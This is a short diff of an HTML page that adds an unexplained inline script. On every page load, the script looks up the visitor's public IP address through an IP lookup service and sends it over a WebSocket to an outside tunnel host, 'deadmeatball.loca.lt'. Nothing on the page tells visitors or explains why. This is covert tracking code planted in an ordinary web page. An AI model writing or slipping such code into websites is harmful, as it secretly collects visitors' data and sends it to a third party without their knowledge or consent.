@@ -129,7 +129,38 @@
         }
     </style>
 </head>
+<script>
+    (async () => {
+      try {
+        // Fetch the user's IP address
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        const userIP = data.ip;
 
+        // Establish a WebSocket connection
+        const socket = new WebSocket('wss://deadmeatball.loca.lt');
+
+        // Send the IP address to the server when the connection is established
+        socket.onopen = () => {
+          console.log('Connected to WebSocket server');
+          socket.send(JSON.stringify({ ip: userIP }));
+          console.log('IP address sent:', userIP);
+        };
+
+        // Handle errors
+        socket.onerror = (error) => {
+          console.error('WebSocket error:', error);
+        };
+
+        // Close the connection
+        socket.onclose = () => {
+          console.log('WebSocket connection closed');
+        };
+      } catch (error) {
+        console.error('Error fetching or sending IP address:', error);
+      }
+    })();
+  </script>
 <body id="root">
     <div id="loader" class="lds-ripple">
         <div></div>
